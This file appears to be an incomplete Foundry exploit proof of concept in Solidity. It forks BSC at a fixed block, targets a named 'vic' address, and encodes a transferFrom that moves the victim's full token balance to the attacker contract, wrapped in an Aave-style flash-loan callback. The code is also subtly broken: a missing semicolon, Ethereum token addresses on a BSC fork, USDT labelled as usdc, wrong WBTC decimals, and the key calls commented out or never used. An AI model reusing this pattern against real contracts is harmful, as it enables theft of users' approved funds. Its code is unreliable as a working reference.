// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "forge-std/Test.sol";
import "./test/interfaces/IUSDT.sol";
import "./test/interfaces/IERC20.sol";

interface ILendingPool {
  function flashLoan(
    address receiver,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

contract ContractTest is Test {
  using SafeMath for uint;
  IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
  IERC20 usdc = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
  address private vic = 0x6F69DfaE189aD285CAb4cEC165c360CCf05Ffa6a;
  address private owner

  ILendingPool aaveLendingPool =
    ILendingPool(0x6807dc923806fE8Fd134338EABCA509979a7e0cB);

  address[] assetAddresses = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];
  uint256[] loanAmounts = [8 * 10**18];
  uint256[] loanModes = [0];
  uint256 amount = IERC20(usdc).balanceOf(address(vic));

  event Log(string message, uint val);

  function setUp() public {
    vm.deal(address(this), 0);
    vm.createSelectFork("https://rpc.ankr.com/bsc", 41528394);
    owner = address(this);
        
  }


  function testAave_flashloan() public {
    emit log_named_uint(
      "Before flashloan, balance of WBTC:",
      WBTC.balanceOf(address(this))
    );

    bytes memory data = abi.encodeWithSelector(
            IERC20(usdc).transferFrom.selector,
            vic,
            address(this),
            amount
        );

    // aaveLendingPool.flashLoan(
    //   address(this),
    //   assetAddresses,
    //   loanAmounts,
    //   loanModes,
    //   address(this),
    //   "0x",
    //   0
    // );

    emit log_named_uint(
      "After flashloan repaid, balance of WBTC:",
       WBTC.balanceOf(address(this))
    );

    emit log_named_uint(
      "usdc balance for attacker after flashloan:",
       usdc.balanceOf(address(this))
    );
  }

  function executeOperation(
    address[] memory _assets,
    uint256[] memory _amounts,
    uint256[] memory _premiums,
    address initiator,
    bytes memory params
  ) public returns (bool) {
    // Loop through the borrowed assets
    for (uint i = 0; i < _assets.length; i++) {
        emit Log("borrowed", _amounts[i]);
        emit Log("fee", _premiums[i]);
        uint amountOwing = _amounts[i].add(_premiums[i]);
        WBTC.approve(address(aaveLendingPool), amountOwing);
    }
    return true;
  }

  receive() external payable {}
}
